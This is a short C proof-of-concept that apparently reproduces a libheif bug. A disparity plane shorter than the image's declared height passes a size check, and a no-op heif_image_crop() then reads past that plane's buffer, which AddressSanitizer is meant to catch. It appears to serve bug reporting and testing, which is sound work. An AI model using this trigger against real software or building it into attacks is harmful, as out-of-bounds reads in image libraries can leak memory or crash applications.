/*
 * PoC: HeifPixelImage::has_standard_plane_sizes() accepts a heif_channel_disparity
 * plane whose actual height is smaller than the image's declared height, so a
 * subsequent heif_image_crop() reads past the end of that plane's buffer.
 *
 * Build against a libheif compiled with -fsanitize=address.
 */

#include <libheif/heif.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
  const int width = 8;
  const int height = 256;
  const int disparity_height = 4; /* much smaller than the image height */

  heif_image* img = NULL;
  heif_error err = heif_image_create(width, height, heif_colorspace_monochrome, heif_chroma_planar, &img);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_create failed\n");
    return 1;
  }

  err = heif_image_add_plane(img, heif_channel_Y, width, height, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add Y plane failed\n");
    return 1;
  }

  /* A disparity map attached at a smaller size than the primary image --
   * heif_image_add_plane()'s documentation explicitly allows a plane
   * narrower/shorter than the parent image ("can be less for subsampling"). */
  err = heif_image_add_plane(img, heif_channel_disparity, width, disparity_height, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "add disparity plane failed\n");
    return 1;
  }

  /* No-op crop (remove 0 pixels from every side) -- still walks every
   * plane's full declared geometry inside HeifPixelImage::crop(). */
  err = heif_image_crop(img, 0, 0, 0, 0);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_crop reported an error: %s\n", err.message);
    heif_image_release(img);
    return 1;
  }

  printf("crop succeeded without a sanitizer report (unexpected)\n");
  heif_image_release(img);
  return 0;
}
